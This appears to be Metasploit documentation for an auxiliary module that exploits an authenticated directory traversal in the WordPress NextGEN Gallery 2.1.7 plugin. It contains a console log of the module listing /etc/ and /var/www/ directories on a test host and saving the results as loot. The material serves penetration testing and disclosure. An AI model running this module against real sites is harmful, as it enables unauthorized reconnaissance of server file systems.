#### Add WordPress Plugin NextGEN Gallery Auth Directory Traversal Vulnerability.

  Application: WordPress Plugin 'NextGEN Galley' 2.1.7
  Homepage: https://wordpress.org/plugins/nextgen-gallery/
  Source Code: https://downloads.wordpress.org/plugin/nextgen-gallery.2.1.7.zip
  Active Installs (wordpress.org): 1 Million+
  References: https://wpvulndb.com/vulnerabilities/8165

#### Vulnerable packages*
        
  2.1.7

#### Module

[wp_nextgen_gallery_dir_read.rb]()
  
#### Usage:

##### Linux (Ubuntu 12.04.5 LTS):
```
 msf> auxiliary(wp_nextgen_galley_dir_read)  run

[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150901032100_default_192.168.1.63_nextgen.traversa_756306.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
 msf> auxiliary(wp_nextgen_galley_dir_read)  head /home/espreto/.msf4/loot/20150901032100_default_192.168.1.63_nextgen.traversa_756306.txt
[*] exec: head /home/espreto/.msf4/loot/20150901032100_default_192.168.1.63_nextgen.traversa_756306.txt

/etc/.java/
/etc/acpi/
/etc/alternatives/
/etc/apache2/
/etc/apm/
/etc/apparmor/
/etc/apparmor.d/
/etc/apport/
/etc/apt/
 msf> auxiliary(wp_nextgen_galley_dir_read)  set DIRPATH /var/www/
DIRPATH => /var/www/
 msf> auxiliary(wp_nextgen_galley_dir_read)  run

[+] 192.168.1.63:80 - File saved in: /home/espreto/.msf4/loot/20150901032225_default_192.168.1.63_nextgen.traversa_376098.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
 msf> auxiliary(wp_nextgen_galley_dir_read)  head /home/espreto/.msf4/loot/20150901032225_default_192.168.1.63_nextgen.traversa_376098.txt
[*] exec: head /home/espreto/.msf4/loot/20150901032225_default_192.168.1.63_nextgen.traversa_376098.txt

/var/www/html/
/var/www/logs/
/var/www/simple-backup/
/var/www/wp-admin/
/
/var/www/wp-includes/
 msf> auxiliary(wp_nextgen_galley_dir_read)
```
